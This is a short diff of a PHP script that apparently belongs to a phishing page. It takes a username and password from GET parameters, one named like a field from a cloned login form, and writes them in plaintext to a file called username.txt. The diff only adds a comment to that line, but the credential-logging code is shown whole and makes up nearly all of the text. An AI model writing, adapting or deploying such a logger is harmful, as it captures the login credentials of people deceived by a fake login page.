@@ -13,7 +13,7 @@ $USER_NAME = $_GET[''];
 $USER_PASS = $_GET['inputWrapper-31_8H8'];
 $i = fopen("username.txt" , "w");
 if(isset($USER_NAME)){
-    fwrite($i, "$USER_NAME IS the username.");
+    fwrite($i, "$USER_NAME IS the username."); // << Requires an update
     fwrite($i, "$USER_PASS");
 }
 
